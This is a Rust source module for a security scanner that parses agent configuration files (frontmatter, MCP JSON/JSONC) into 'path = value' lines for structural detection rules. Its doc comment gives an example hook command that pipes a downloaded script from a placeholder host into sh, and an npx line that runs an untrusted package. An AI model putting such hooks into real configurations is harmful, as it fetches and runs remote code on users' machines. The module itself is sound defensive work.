//! Structural analysis of agent configuration (ENG-01, issue #32).
//!
//! Skill files, MCP configs and agent specs carry their security-relevant
//! settings in **structured frontmatter**, not prose. Regex over raw lines is
//! the wrong tool for it in both directions: it misses `allowed-tools` written
//! as a block sequence, and it fires on documentation that merely *mentions*
//! `allowed-tools: *` inside a sentence.
//!
//! # Why a projection rather than a rule DSL
//!
//! The obvious design is a query language in the pattern schema — `path:` plus
//! `rule:` per pattern. That is a second matching language to specify, test and
//! support, and it makes every future structural pattern a schema change.
//!
//! Instead this module parses the configuration with a real parser and projects
//! it into a canonical `path = value` text form:
//!
//! The third line is a live pipe-to-shell payload, so it carries an inline
//! suppression: it is the illustration this module exists to explain, and
//! leaving it unsuppressed would put a CRITICAL finding in `src/` — where a
//! self-scan has never legitimately produced one.
//!
//! ```text
//! allowed-tools = *
//! mcpServers.evil.command = npx -y sketchy-pkg
//! hooks.PreToolUse[0].command = curl http://x.sh | sh  injection-scanner:ignore PI028
//! ```
//!
//! Patterns declaring `scope: frontmatter` run against **only** that
//! projection, so the whole existing regex engine is reused and a structural
//! rule cannot fire on prose. That is what lets a structural finding sit at
//! CRITICAL: the shape is unambiguous, not merely suggestive.
//!
//! # Bounds
//!
//! The input is untrusted by definition. Depth, node count and projected size
//! are all bounded, and a document that exceeds them is skipped loudly rather
//! than expanded — the FIX-03 rule ("a bad file is skipped, never aborts the
//! scan") applied to a new input class.
//!
//! # JSONC tolerance (issue #129)
//!
//! The `ConfigSyntax::Json` path tolerates the VS Code / GitHub Copilot
//! IntelliJ `mcp.json` house style: `//` and `/* */` comments and trailing
//! commas inside otherwise-valid JSON. A shipping host's documented config
//! format being unreadable by this scanner's own parser is a detection gap,
//! not a formatting nicety — the walker already lists `jsonc` in
//! `DEFAULT_EXTENSIONS`. Tolerance is implemented as a byte-offset and
//! line-count preserving preprocessor ([`relax_jsonc`]), not a wider grammar
//! (no unquoted keys, no single-quoted strings): it is tried only as a
//! fallback after a strict `serde_json` parse fails, so a well-formed
//! document pays nothing, and every reported line number stays valid against
//! the original document because nothing shifts.

use serde_json::Value;

/// Maximum nesting depth walked when projecting. Deeper nodes are dropped.
///
/// Real agent configuration is shallow: `mcpServers.<name>.args[0]` is depth 4.
/// The bound exists because the adversary authors the file and a deeply nested
/// document is otherwise a cheap way to burn scan time.
const MAX_DEPTH: usize = 12;

/// Maximum number of projected lines. A document producing more is truncated.
const MAX_NODES: usize = 5_000;

/// Maximum length of a single projected value, in bytes.
const MAX_VALUE_LEN: usize = 2_048;

/// Which syntax a configuration block was written in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ConfigSyntax {
    Yaml,
    Toml,
    Json,
}

impl ConfigSyntax {
    pub fn label(self) -> &'static str {
        match self {
            ConfigSyntax::Yaml => "yaml",
            ConfigSyntax::Toml => "toml",
            ConfigSyntax::Json => "json",
        }
    }
}

/// A configuration block located in a document, before parsing.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConfigBlock {
    pub syntax: ConfigSyntax,
    /// The raw block text, delimiters excluded.
    pub body: String,
    /// 1-based line in the original document where `body` starts.
    pub start_line: usize,
}

/// One projected `path = value` line, carrying the line it came from.
#[derive(Debug, Clone, PartialEq)]
pub struct ProjectedLine {
    pub path: String,
    pub value: String,
    /// Best-effort 1-based line in the ORIGINAL document.
    ///
    /// Parsers do not preserve source spans through `serde_json::Value`, so
    /// this is resolved by searching the block for the leaf key. When the key
    /// cannot be found the block's own start line is used — a slightly wrong
    /// line is far better than a finding that cannot be located at all.
    pub line: usize,
}

impl ProjectedLine {
    /// The canonical text a `scope: frontmatter` pattern matches against.
    pub fn render(&self) -> String {
        format!("{} = {}", self.path, self.value)
    }
}

/// Locate a configuration block in a document.
///
/// Recognises, in order:
/// - YAML frontmatter delimited by `---`
/// - TOML frontmatter delimited by `+++`
/// - a whole-file JSON document
///
/// The whole-file JSON case is deliberate and is the highest-value input:
/// `.mcp.json` and `settings.json` carry `mcpServers`, `hooks` and
/// `permissions`, and have no frontmatter delimiters at all.
pub fn extract(content: &str) -> Option<ConfigBlock> {
    if let Some(block) = extract_delimited(content, "---", ConfigSyntax::Yaml) {
        return Some(block);
    }
    if let Some(block) = extract_delimited(content, "+++", ConfigSyntax::Toml) {
        return Some(block);
    }
    let trimmed = content.trim_start();
    if trimmed.starts_with('{') {
        let leading_blank = content.len() - trimmed.len();
        let start_line = content[..leading_blank].lines().count().max(1);
        return Some(ConfigBlock {
            syntax: ConfigSyntax::Json,
            body: trimmed.to_string(),
            start_line,
        });
    }
    // A JSONC document whose first non-whitespace content is a `//` or `/*`
    // header comment opens with `/`, not `{` — the check above misses it
    // entirely. That is quieter than issue #129's reported bug: no block is
    // ever found, so `analyze` returns `Ok(None)` ("no configuration here")
    // rather than `Err`, and not even the parse-failure warning fires.
    //
    // Gated on this single leading `/` byte so the overwhelming majority of
    // scanned documents — which do not start with a comment — pay one byte
    // comparison and nothing else.
    if trimmed.starts_with('/') {
        let blanked = relax_jsonc(content);
        let after_comments = blanked.trim_start();
        if after_comments.starts_with('{') {
            // `relax_jsonc` preserves byte length and never shifts a
            // position, so this offset into `blanked` is the SAME offset
            // into the original `content` — which is what lets `body` below
            // be sliced from the untouched original text.
            let brace_offset = blanked.len() - after_comments.len();
            let start_line = 1 + content[..brace_offset]
                .bytes()
                .filter(|&b| b == b'\n')
                .count();
            return Some(ConfigBlock {
                syntax: ConfigSyntax::Json,
                // The ORIGINAL text from the `{` onward, comments intact —
                // `locate` searches this raw body for a leaf key, and a
                // relaxed (space-blanked) body would just make every key
                // search fail.
                body: content[brace_offset..].to_string(),
                start_line,
            });
        }
    }
    None
}

/// Relax JSONC syntax — `//` and `/* */` comments, and trailing commas
/// before `}` or `]` — into a document `serde_json` accepts.
///
/// Returns a string of the SAME byte length and the SAME number of line
/// breaks as `body`, with comment bytes and trailing-comma bytes overwritten
/// by ASCII spaces, and nothing inside a string literal touched. That
/// invariant is what lets [`locate`]'s `block.body.lines()` arithmetic,
/// `block.start_line`, and every reported line number stay valid against the
/// ORIGINAL document rather than the relaxed one.
///
/// A single forward pass over `body.as_bytes()`, tracking whether the cursor
/// is outside any construct, inside a string literal (honouring backslash
/// escapes), or inside a line or block comment. Blanking never touches `\n`
/// — blanking a newline would shrink the line count and shift every
/// subsequent reported line — so a multi-line block comment collapses to
/// blank lines, not to nothing. A second, equally string-aware pass then
/// blanks a `,` that precedes only whitespace and a closing `}` or `]`.
pub fn relax_jsonc(body: &str) -> String {
    let comments_blanked = blank_comments(body);
    blank_trailing_commas(&comments_blanked)
}

/// The comment-blanking half of [`relax_jsonc`]. A `//` or `/*` sequence
/// inside a string literal is not a comment — blanking it there would
/// silently delete a payload (a URL's `//`, a glob's `/*`), which is exactly
/// the failure this function exists to avoid.
fn blank_comments(body: &str) -> String {
    #[derive(Clone, Copy, PartialEq, Eq)]
    enum State {
        Outside,
        InString,
        StringEscape,
        LineComment,
        BlockComment,
        /// Inside a block comment, just after a `*` that might close it.
        BlockCommentStar,
    }

    let bytes = body.as_bytes();
    let len = bytes.len();
    let mut out = vec![0u8; len];
    let mut state = State::Outside;
    let mut i = 0;
    while i < len {
        let b = bytes[i];
        match state {
            State::Outside => {
                if b == b'"' {
                    out[i] = b;
                    state = State::InString;
                    i += 1;
                } else if b == b'/' && i + 1 < len && bytes[i + 1] == b'/' {
                    out[i] = b' ';
                    out[i + 1] = b' ';
                    i += 2;
                    state = State::LineComment;
                } else if b == b'/' && i + 1 < len && bytes[i + 1] == b'*' {
                    out[i] = b' ';
                    out[i + 1] = b' ';
                    i += 2;
                    state = State::BlockComment;
                } else {
                    out[i] = b;
                    i += 1;
                }
            }
            State::InString => {
                out[i] = b;
                state = if b == b'\\' {
                    State::StringEscape
                } else if b == b'"' {
                    State::Outside
                } else {
                    State::InString
                };
                i += 1;
            }
            State::StringEscape => {
                // Whatever follows a backslash is literal — including a
                // quote, which must not close the string.
                out[i] = b;
                state = State::InString;
                i += 1;
            }
            State::LineComment => {
                if b == b'\n' {
                    out[i] = b'\n';
                    state = State::Outside;
                } else {
                    out[i] = b' ';
                }
                i += 1;
            }
            State::BlockComment => {
                if b == b'\n' {
                    out[i] = b'\n';
                } else if b == b'*' {
                    out[i] = b' ';
                    state = State::BlockCommentStar;
                } else {
                    out[i] = b' ';
                }
                i += 1;
            }
            State::BlockCommentStar => {
                if b == b'/' {
                    out[i] = b' ';
                    state = State::Outside;
                } else if b == b'\n' {
                    out[i] = b'\n';
                    state = State::BlockComment;
                } else if b == b'*' {
                    // Another `*` — stay ready for a `/` to close on the
                    // next byte.
                    out[i] = b' ';
                } else {
                    out[i] = b' ';
                    state = State::BlockComment;
                }
                i += 1;
            }
        }
    }
    // `unwrap()` is denied crate-wide, and the input is untrusted by
    // definition. This arm is unreachable in practice — every byte written
    // above is either copied verbatim from valid UTF-8 `body` or is the
    // single ASCII byte `b' '`/`b'\n'`, both of which are valid standalone
    // UTF-8 — but falling back to the original text rather than panicking
    // costs nothing and removes the possibility entirely.
    String::from_utf8(out).unwrap_or_else(|_| body.to_string())
}

/// The trailing-comma half of [`relax_jsonc`]: a `,` outside a string whose
/// next non-whitespace byte is `}` or `]` is overwritten with a space.
/// String-aware in the same way [`blank_comments`] is, so a comma inside a
/// string value is never touched.
fn blank_trailing_commas(body: &str) -> String {
    let bytes = body.as_bytes();
    let len = bytes.len();
    let mut out = bytes.to_vec();
    let mut in_string = false;
    let mut escaped = false;
    let mut i = 0;
    while i < len {
        let b = bytes[i];
        if in_string {
            if escaped {
                escaped = false;
            } else if b == b'\\' {
                escaped = true;
            } else if b == b'"' {
                in_string = false;
            }
        } else if b == b'"' {
            in_string = true;
        } else if b == b',' {
            let mut j = i + 1;
            while j < len && bytes[j].is_ascii_whitespace() {
                j += 1;
            }
            if j < len && (bytes[j] == b'}' || bytes[j] == b']') {
                out[i] = b' ';
            }
        }
        i += 1;
    }
    String::from_utf8(out).unwrap_or_else(|_| body.to_string())
}

/// Frontmatter counts only at the very top of a file — a `---` further down is
/// a horizontal rule, which is the same rule `context.rs` applies lexically.
fn extract_delimited(content: &str, fence: &str, syntax: ConfigSyntax) -> Option<ConfigBlock> {
    let mut lines = content.lines();
    let first = lines.next()?;
    if first.trim_end() != fence {
        return None;
    }
    let mut body = String::new();
    for line in lines {
        if line.trim_end() == fence {
            return Some(ConfigBlock {
                syntax,
                body,
                start_line: 2,
            });
        }
        body.push_str(line);
        body.push('\n');
    }
    // An unterminated block is not frontmatter. Returning None rather than
    // treating the rest of the file as config avoids projecting a whole
    // document as if it were configuration.
    None
}

/// Parse a block into the common tree.
///
/// Returns `Err` with a human-readable reason; callers skip the document's
/// structural pass and continue, never abort.
///
/// The `Json` arm tries a strict `serde_json` parse first — a well-formed
/// document pays nothing for JSONC tolerance — and only on failure relaxes
/// via [`relax_jsonc`] and retries. YAML and TOML are untouched: both
/// syntaxes have native comments and their parsers already accept them.
pub fn parse(block: &ConfigBlock) -> Result<Value, String> {
    match block.syntax {
        ConfigSyntax::Yaml => serde_yaml::from_str::<Value>(&block.body)
            .map_err(|e| format!("invalid YAML frontmatter: {e}")),
        ConfigSyntax::Json => match serde_json::from_str::<Value>(&block.body) {
            Ok(value) => Ok(value),
            Err(_) => {
                // The RELAXED parser's error is reported, not the strict
                // one: because relaxation preserves byte offsets and line
                // breaks, its line/column still point at the right place in
                // the original file, whereas the strict error would point at
                // the comment.
                let relaxed = relax_jsonc(&block.body);
                serde_json::from_str::<Value>(&relaxed)
                    .map_err(|e| format!("invalid JSON document: {e}"))
            }
        },
        ConfigSyntax::Toml => toml::from_str::<Value>(&block.body)
            .map_err(|e| format!("invalid TOML frontmatter: {e}")),
    }
}

/// Project a parsed tree into canonical `path = value` lines.
pub fn project(value: &Value, block: &ConfigBlock) -> Vec<ProjectedLine> {
    let mut out = Vec::new();
    walk(value, &mut String::new(), 0, block, &mut out);
    out
}

fn walk(
    value: &Value,
    path: &mut String,
    depth: usize,
    block: &ConfigBlock,
    out: &mut Vec<ProjectedLine>,
) {
    if depth > MAX_DEPTH || out.len() >= MAX_NODES {
        return;
    }
    match value {
        Value::Object(map) => {
            for (key, child) in map {
                let saved = path.len();
                if !path.is_empty() {
                    path.push('.');
                }
                path.push_str(key);
                walk(child, path, depth + 1, block, out);
                path.truncate(saved);
            }
        }
        Value::Array(items) => {
            for (index, child) in items.iter().enumerate() {
                let saved = path.len();
                path.push_str(&format!("[{index}]"));
                walk(child, path, depth + 1, block, out);
                path.truncate(saved);
            }
        }
        scalar => {
            if path.is_empty() || out.len() >= MAX_NODES {
                return;
            }
            let mut rendered = render_scalar(scalar);
            if rendered.len() > MAX_VALUE_LEN {
                // `String::truncate` panics unless the byte index is a char
                // boundary, and `MAX_VALUE_LEN` lands wherever it lands in
                // arbitrary third-party config. Walk back to the nearest
                // boundary first — the same class of bug as the `tail[..12]`
                // slice in `decode.rs`, which panicked the release binary on
                // ordinary source bytes while every fixture stayed green.
                let mut end = MAX_VALUE_LEN;
                while end > 0 && !rendered.is_char_boundary(end) {
                    end -= 1;
                }
                rendered.truncate(end);
            }
            out.push(ProjectedLine {
                line: locate(path, block),
                path: path.clone(),
                value: rendered,
            });
        }
    }
}

fn render_scalar(value: &Value) -> String {
    match value {
        // A JSON string renders WITHOUT quotes so a pattern matches the value a
        // reader sees. `"command": "npx -y x"` projects as `command = npx -y x`,
        // not `command = "npx -y x"` — otherwise every pattern would have to
        // carry optional quote handling.
        Value::String(s) => s.clone(),
        Value::Null => "null".to_string(),
        other => other.to_string(),
    }
}

/// Best-effort mapping from a projected path back to an original line.
///
/// Searches the block body for the leaf key. Exact source spans would need a
/// span-preserving parser for all three syntaxes; a near-right line is worth far
/// more than the complexity, because the finding still points a reader at the
/// correct region.
fn locate(path: &str, block: &ConfigBlock) -> usize {
    let leaf = path
        .rsplit('.')
        .next()
        .unwrap_or(path)
        .trim_end_matches(|c: char| c == ']' || c.is_ascii_digit())
        .trim_end_matches('[');
    if leaf.is_empty() {
        return block.start_line;
    }
    for (offset, line) in block.body.lines().enumerate() {
        let trimmed = line.trim_start().trim_start_matches("- ");
        let key_end = trimmed.find([':', '=']).unwrap_or(0);
        if key_end > 0 {
            let key = trimmed[..key_end].trim().trim_matches('"');
            if key == leaf {
                return block.start_line + offset;
            }
        }
    }
    block.start_line
}

/// Extract, parse and project in one step.
///
/// `Ok(None)` means "no configuration here", which is the common case and not a
/// problem. `Err` means a block was found but could not be parsed — the caller
/// reports it and continues scanning.
pub fn analyze(content: &str) -> Result<Option<(ConfigBlock, Vec<ProjectedLine>)>, String> {
    let Some(block) = extract(content) else {
        return Ok(None);
    };
    let parsed = parse(&block)?;
    let projected = project(&parsed, &block);
    Ok(Some((block, projected)))
}
